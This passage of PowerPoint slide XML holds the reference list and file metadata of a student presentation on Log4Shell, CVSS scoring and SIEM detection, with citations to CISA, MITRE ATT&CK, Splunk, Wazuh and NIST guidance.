            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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8. CISA, “Emergency Directive 22-02,” 2021.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1965960"/>
            <a:ext cx="5394960" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>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9. Cyber Safety Review Board, “Log4j Event,” 2022.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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10. ACSC, “2021-007: Log4j advice &amp; mitigations.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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11. Siemens ProductCERT, Log4j advisories.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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12. Wetter &amp; Ringland, Google, 2021.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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13. Splunk TRT, “Detecting Log4j 2 RCE.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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14. Wazuh, “Detecting Log4Shell with Wazuh.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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15. MITRE ATT&amp;CK, “T1190.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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16. NIST SP 800-61r3, 2025.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="6035040"/>
            <a:ext cx="10972800" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6E7A8C"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Full IEEE reference list with URLs is provided in the accompanying report.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Log4Shell — CVSS &amp; SIEM</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>COMP2004 student</dc:creator>
  <cp:lastModifiedBy>COMP2004 student</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-24T08:17:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-24T08:17:14Z</dcterms:modified>
</cp:coreProperties>
</file>